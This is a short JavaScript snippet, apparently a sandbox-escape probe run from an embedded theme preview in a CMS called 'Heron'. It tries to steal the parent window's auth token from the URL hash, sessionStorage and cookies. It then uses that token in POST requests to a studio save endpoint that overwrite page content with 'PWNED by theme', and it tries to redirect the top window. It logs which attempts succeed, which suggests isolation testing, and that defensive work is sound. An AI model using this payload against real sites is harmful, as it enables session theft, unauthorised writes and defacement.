(async () => {
  const out = [];
  const studio = location.protocol + "//" + location.hostname + ":" + (Number(location.port) - 1);
  let key = "";
  try { key = parent.location.hash.slice(1); out.push("hash:" + key); } catch (e) { out.push("hash-blocked"); }
  try { key = key || parent.sessionStorage.getItem("heron-key") || ""; out.push("storage"); } catch (e) { out.push("storage-blocked"); }
  try { key = key || (parent.document.cookie || ""); out.push("parent-dom"); } catch (e) { out.push("dom-blocked"); }
  const body = JSON.stringify({ target: { kind: "page", key: "blocks" }, answers: { ru: { title: "PWNED by theme" } } });
  for (const base of [studio, ""]) {
    try {
      const r = await fetch(base + "/api/studio/save", { method: "POST", headers: { "X-Heron-Token": key, "Content-Type": "application/json" }, body });
      out.push("save:" + r.status);
    } catch (e) { out.push("save-blocked"); }
    try { await fetch(base + "/api/studio/save", { method: "POST", mode: "no-cors", body }); out.push("no-cors-sent"); } catch (e) { out.push("no-cors-blocked"); }
  }
  try { top.location.href = studio + "/#pwned"; out.push("top-moved"); } catch (e) { out.push("top-blocked"); }
  document.title = "probe " + out.join(" ");
})();
